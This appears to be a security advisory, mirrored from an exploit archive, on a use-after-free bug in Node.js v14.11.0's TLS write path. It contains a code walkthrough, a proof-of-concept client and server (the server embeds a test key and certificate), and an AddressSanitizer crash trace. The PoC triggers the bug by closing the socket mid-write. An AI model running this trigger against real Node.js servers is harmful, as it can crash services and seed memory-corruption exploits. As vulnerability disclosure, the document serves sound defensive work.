@@ -1,0 +1,256 @@
+id: 35619
+date: 01/05/2021
+title: Node.js TLSWrap Use-After-Free Vulnerability
+author: Felix Wilhelm
+cves: 
+
+Node.js: use-after-free in TLSWrap
+
+Node v14.11.0 (Current) is vulnerable to a use-after-free bug in its TLS implementation.
+When writing to a TLS enabled socket, node::StreamBase::Write calls node::TLSWrap::DoWrite
+with a freshly allocated WriteWrap object as first argument. If the DoWrite method
+does not return an error, this object is passed back to the caller as part of a 
+StreamWriteResult structure:
+
+  // stream_base-inl.h
+  WriteWrap* req_wrap = CreateWriteWrap(req_wrap_obj);
+
+  err = DoWrite(req_wrap, bufs, count, send_handle);
+  bool async = err == 0;
+
+  if (!async) {
+    req_wrap->Dispose();
+    req_wrap = nullptr;
+  }
+
+  const char* msg = Error();
+  if (msg != nullptr) {
+    req_wrap_obj->Set(env->context(),
+                      env->error_string(),
+                      OneByteString(env->isolate(), msg)).Check();
+    ClearError();
+  }
+
+  return StreamWriteResult { async, err, req_wrap, total_bytes };
+
+The problem is that TLSWrap::DoWrite can trigger a free of the WriteWrap object 
+without returning an error when the EncOut() call at the end of the DoWrite method fails.
+EncOut() calls underlying_stream()->Write() to write TLS encrypted data to the network socket.
+If this write fails, InvokeQueued() is called and the function returns immediately:
+
+  // tls_wrap.cc
+  // Write any encrypted/handshake output that may be ready.
+  // Guard against sync call of current_write_->Done(), its unsupported.
+  in_dowrite_ = true;
+  EncOut();
+  in_dowrite_ = false;
+
+  return 0;
+
+  // tls_wrap.cc
+  void TLSWrap::EncOut() {
+  [...]
+
+  Debug(this, \"Writing %zu buffers to the underlying stream\", count);
+  StreamWriteResult res = underlying_stream()->Write(bufs, count);
+  if (res.err != 0) {
+    InvokeQueued(res.err);
+    return;
+  }
+  [..]
+
+InvokeQueued() triggers an immediate free of the req_wrap WriteWrap* object via the
+following call chain: 
+node::TLSWrap::InvokeQueued -> node::StreamReq::Done -> node::WriteWrap::OnDone
+-> node::StreamReq::Dispose -> node::BaseObjectPtrImpl<node::AsyncWrap, false>::~BaseObjectPtrImpl()
+-> node::BaseObject::decrease_refcount() -> node::SimpleWriteWrap<node::AsyncWrap>::~SimpleWriteWrap()
+
+Making underlying_stream()->Write fail is as easy as closing the socket at the other side 
+of the connection just before the write to trigger a broken pipe error. 
+
+Because node::TLSWrap::DoWrite doesn't return an error code, node::StreamBase::Write will return 
+the freed WriteWrap object as part of its StreamWriteResult. For calls by node::StreamBase::WriteV, 
+this will immediately trigger a use-after-free when the SetAllocatedStorage() method 
+is called on the freed object:
+
+  // stream_base.cc
+  StreamWriteResult res = Write(*bufs, count, nullptr, req_wrap_obj);
+  SetWriteResult(res);
+  if (res.wrap != nullptr && storage_size > 0) {
+    res.wrap->SetAllocatedStorage(std::move(storage));
+  }
+
+The bug can be easily triggered against a simple node HTTPS server application. Under normal 
+circumstances and without an ASAN enabled build, the UAF doesn't trigger a crash on Linux 
+as the freed memory  won't get reallocated in time and the write in SetAllocatedStorage 
+corrupts chunk metadata  that isn't used for small chunks. 
+I think this is the only reason why the bug wasn't spotted earlier, as the broken pipe error path should be hit 
+pretty often in the real world. However, this issue might still be exploitable with the right heap layout 
+(if the WriteWrap chunk is merged with a larger chunk during the free), different heap implementations 
+and/or some other control flow that allows to allocate something before the reuse. 
+
+Proof-of-Concept:
+
+server.js:
+const https = require('https');
+
+const key = `-----BEGIN EC PARAMETERS-----
+BggqhkjOPQMBBw==
+-----END EC PARAMETERS-----
+-----BEGIN EC PRIVATE KEY-----
+MHcCAQEEIDKfHHbiJMdu2STyHL11fWC7psMY19/gUNpsUpkwgGACoAoGCCqGSM49
+AwEHoUQDQgAEItqm+pYj3Ca8bi5mBs+H8xSMxuW2JNn4I+kw3aREsetLk8pn3o81
+PWBiTdSZrGBGQSy+UAlQvYeE6Z/QXQk8aw==
+-----END EC PRIVATE KEY-----`
+
+const cert = `-----BEGIN CERTIFICATE-----
+MIIBhjCCASsCFDJU1tCo88NYU//pE+DQKO9hUDsFMAoGCCqGSM49BAMCMEUxCzAJ
+BgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5l
+dCBXaWRnaXRzIFB0eSBMdGQwHhcNMjAwOTIyMDg1NDU5WhcNNDgwMjA3MDg1NDU5
+WjBFMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwY
+SW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcD
+QgAEItqm+pYj3Ca8bi5mBs+H8xSMxuW2JNn4I+kw3aREsetLk8pn3o81PWBiTdSZ
+rGBGQSy+UAlQvYeE6Z/QXQk8azAKBggqhkjOPQQDAgNJADBGAiEA7Bdn4F87KqIe
+Y/ABy/XIXXpFUb2nyv3zV7POQi2lPcECIQC3UWLmfiedpiIKsf9YRIyO0uEood7+
+glj2R1NNr1X68w==
+-----END CERTIFICATE-----`
+
+const options = {
+  key: key,
+  cert: cert,
+};
+
+https.createServer(options, function (req, res) {
+  res.writeHead(200);
+  res.end(\"hello world\
+\");
+}).listen(4444);
+
+---
+
+poc.js:
+
+const tls = require('tls')
+
+var socket = tls.connect(4444, 'localhost', {rejectUnauthorized : false}, () => {
+  console.log(\"connected\")
+  socket.write(\"GET / HTTP/1.1\\
+Host: localhost\\
+Connection: Keep-alive\\
+\\
+\")
+  socket.write(\"GET / HTTP/1.1\\
+Host: localhost\\
+Connection: Keep-alive\\
+\\
+\")
+  socket.write(\"GET / HTTP/1.1\\
+Host: localhost\\
+Connection: Keep-alive\\
+\\
+\")
+})
+
+
+socket.on('data', () => {
+  socket.destroy()
+})  
+
+
+
+
+
+The POC triggers a crash when server.js is run on an ASAN enabled build of node.js: 
+
+==1408671==ERROR: AddressSanitizer: heap-use-after-free on address 0x608000011138 at pc 0x0000011929b6 bp 0x7ffc8c2243f0 sp 0x7ffc8c2243e8
+READ of size 8 at 0x608000011138 thread T0
+    #0 0x11929b5 in std::__uniq_ptr_impl<v8::BackingStore, std::default_delete<v8::BackingStore> >::_M_ptr() const /usr/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/unique_ptr.h:154:42
+    #1 0x1192974 in std::unique_ptr<v8::BackingStore, std::default_delete<v8::BackingStore> >::get() const /usr/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/unique_ptr.h:361:21
+    #2 0x1193fb4 in std::unique_ptr<v8::BackingStore, std::default_delete<v8::BackingStore> >::operator bool() const /usr/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/unique_ptr.h:375:16
+    #3 0x1190415 in node::AllocatedBuffer::data() /pwd/out/../src/allocated_buffer-inl.h:79:8
+    #4 0x16f8a79 in node::WriteWrap::SetAllocatedStorage(node::AllocatedBuffer&&) /pwd/out/../src/stream_base-inl.h:247:3
+    #5 0x16f1141 in node::StreamBase::Writev(v8::FunctionCallbackInfo<v8::Value> const&) /pwd/out/../src/stream_base.cc:172:15
+    #6 0x16faa47 in void node::StreamBase::JSMethod<&(node::StreamBase::Writev(v8::FunctionCallbackInfo<v8::Value> const&))>(v8::FunctionCallbackInfo<v8::Value> const&) /pwd/out/../src/stream_base.cc:468:29
+    #7 0x1caf642 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo) /pwd/out/../deps/v8/src/api/api-arguments-inl.h:158:3
+    #8 0x1cabfaf in v8::internal::MaybeHandle<v8::internal::Object> v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate*, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::FunctionTemplateInfo>, v8::internal::Handle<v8::internal::Object>, v8::internal::BuiltinArguments) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:111:36
+    #9 0x1ca8f8a in v8::internal::Builtin_Impl_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate*) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:141:5
+    #10 0x1ca81e0 in v8::internal::Builtin_HandleApiCall(int, unsigned long*, v8::internal::Isolate*) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:129:1
+    #11 0x3e096df in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit (/p0/node/node-v14.11.0/out/Debug/node+0x3e096df)
+
+0x608000011138 is located 24 bytes inside of 88-byte region [0x608000011120,0x608000011178)
+freed by thread T0 here:
+    #0 0xe79b1d in operator delete(void*) (/p0/node/node-v14.11.0/out/Debug/node+0xe79b1d)
+    #1 0x1707177 in node::SimpleWriteWrap<node::AsyncWrap>::~SimpleWriteWrap() /pwd/out/../src/stream_base.h:418:7
+    #2 0xf943be in node::BaseObject::decrease_refcount() /pwd/out/../src/base_object-inl.h:203:7
+    #3 0x10886e6 in node::BaseObjectPtrImpl<node::AsyncWrap, false>::~BaseObjectPtrImpl() /pwd/out/../src/base_object-inl.h:248:12
+    #4 0x13c2a3c in node::StreamReq::Dispose() /pwd/out/../src/stream_base-inl.h:40:1
+    #5 0x16f794c in node::WriteWrap::OnDone(int) /pwd/out/../src/stream_base.cc:591:3
+    #6 0x10e71f8 in node::StreamReq::Done(int, char const*) /pwd/out/../src/stream_base-inl.h:261:3
+    #7 0x1921f95 in node::TLSWrap::InvokeQueued(int, char const*) /pwd/out/../src/tls_wrap.cc:101:8
+    #8 0x1927f39 in node::TLSWrap::EncOut() /pwd/out/../src/tls_wrap.cc:356:5
+    #9 0x192e258 in node::TLSWrap::DoWrite(node::WriteWrap*, uv_buf_t*, unsigned long, uv_stream_s*) /pwd/out/../src/tls_wrap.cc:820:3
+    #10 0x13b50dd in node::StreamBase::Write(uv_buf_t*, unsigned long, uv_stream_s*, v8::Local<v8::Object>) /pwd/out/../src/stream_base-inl.h:193:9
+    #11 0x16f108f in node::StreamBase::Writev(v8::FunctionCallbackInfo<v8::Value> const&) /pwd/out/../src/stream_base.cc:169:27
+    #12 0x16faa47 in void node::StreamBase::JSMethod<&(node::StreamBase::Writev(v8::FunctionCallbackInfo<v8::Value> const&))>(v8::FunctionCallbackInfo<v8::Value> const&) /pwd/out/../src/stream_base.cc:468:29
+    #13 0x1caf642 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo) /pwd/out/../deps/v8/src/api/api-arguments-inl.h:158:3
+    #14 0x1cabfaf in v8::internal::MaybeHandle<v8::internal::Object> v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate*, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::FunctionTemplateInfo>, v8::internal::Handle<v8::internal::Object>, v8::internal::BuiltinArguments) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:111:36
+    #15 0x1ca8f8a in v8::internal::Builtin_Impl_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate*) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:141:5
+    #16 0x1ca81e0 in v8::internal::Builtin_HandleApiCall(int, unsigned long*, v8::internal::Isolate*) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:129:1
+    #17 0x3e096df in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit (/p0/node/node-v14.11.0/out/Debug/node+0x3e096df)
+ 
+previously allocated by thread T0 here:
+    #0 0xe792bd in operator new(unsigned long) (/p0/node/node-v14.11.0/out/Debug/node+0xe792bd)
+    #1 0x16f81c2 in node::StreamBase::CreateWriteWrap(v8::Local<v8::Object>) /pwd/out/../src/stream_base.cc:629:10
+    #2 0x13b4fb0 in node::StreamBase::Write(uv_buf_t*, unsigned long, uv_stream_s*, v8::Local<v8::Object>) /pwd/out/../src/stream_base-inl.h:191:25
+    #3 0x16f108f in node::StreamBase::Writev(v8::FunctionCallbackInfo<v8::Value> const&) /pwd/out/../src/stream_base.cc:169:27
+    #4 0x16faa47 in void node::StreamBase::JSMethod<&(node::StreamBase::Writev(v8::FunctionCallbackInfo<v8::Value> const&))>(v8::FunctionCallbackInfo<v8::Value> const&) /pwd/out/../src/stream_base.cc:468:29
+    #5 0x1caf642 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo) /pwd/out/../deps/v8/src/api/api-arguments-inl.h:158:3
+    #6 0x1cabfaf in v8::internal::MaybeHandle<v8::internal::Object> v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate*, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::FunctionTemplateInfo>, v8::internal::Handle<v8::internal::Object>, v8::internal::BuiltinArguments) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:111:36
+    #7 0x1ca8f8a in v8::internal::Builtin_Impl_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate*) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:141:5
+    #8 0x1ca81e0 in v8::internal::Builtin_HandleApiCall(int, unsigned long*, v8::internal::Isolate*) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:129:1
+    #9 0x3e096df in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit (/p0/node/node-v14.11.0/out/Debug/node+0x3e096df)
+    #10 0x3c06181 in Builtins_InterpreterEntryTrampoline (/p0/node/node-v14.11.0/out/Debug/node+0x3c06181)
+    #11 0x3c06181 in Builtins_InterpreterEntryTrampoline (/p0/node/node-v14.11.0/out/Debug/node+0x3c06181)
+   
+
+SUMMARY: AddressSanitizer: heap-use-after-free /usr/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/unique_ptr.h:154:42 in std::__uniq_ptr_impl<v8::BackingStore, std::default_delete<v8::BackingStore> >::_M_ptr() const
+Shadow bytes around the buggy address:
+  0x0c107fffa1d0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd
+  0x0c107fffa1e0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd
+  0x0c107fffa1f0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd
+  0x0c107fffa200: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 fa
+  0x0c107fffa210: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd
+=>0x0c107fffa220: fa fa fa fa fd fd fd[fd]fd fd fd fd fd fd fd fa
+  0x0c107fffa230: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd
+  0x0c107fffa240: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd
+  0x0c107fffa250: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd
+  0x0c107fffa260: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd
+  0x0c107fffa270: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+  Shadow gap:              cc
+==1408671==ABORTING
+
+
+
+Credits: 
+Felix Wilhelm of Google Project Zero
+
+#  0day.today [2023-03-26]  #
